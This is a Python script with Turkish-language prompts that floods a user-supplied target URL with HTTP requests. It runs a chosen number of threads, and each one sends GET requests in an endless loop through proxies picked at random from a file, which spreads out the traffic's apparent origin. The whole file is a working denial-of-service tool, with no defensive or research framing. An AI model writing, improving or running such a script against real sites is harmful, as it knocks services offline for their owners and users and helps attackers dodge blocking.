import threading
import requests
import random

url = input("Hedef URL'yi girin: ")
proxy_file_path = input("Proxy listesi dosyasının yolunu girin: ")
thread_count = int(input("Gönderilecek istek sayısını girin: "))

# Proxy listesini dosyadan okuma
def load_proxies(file_path):
    try:
        with open(file_path, 'r') as file:
            proxies = file.read().splitlines()
        return proxies
    except FileNotFoundError:
        print("Proxy listesi dosyası bulunamadı.")
        return []

proxy_list = load_proxies(proxy_file_path)

def send_request_with_proxy():
    if not proxy_list:
        print("Proxy listesi boş, işlem iptal edildi.")
        return

    while True:
        proxy = {"http": random.choice(proxy_list)}
        try:
            response = requests.get(url, proxies=proxy, timeout=5)
            print(f"Status Code: {response.status_code} | Proxy: {proxy['http']}")
        except requests.exceptions.RequestException as e:
            print(f"Hata: {e} | Proxy: {proxy['http']}")

threads = []

for i in range(thread_count):
    t = threading.Thread(target=send_request_with_proxy)
    t.start()
    threads.append(t)

for t in threads:
    t.join()
  
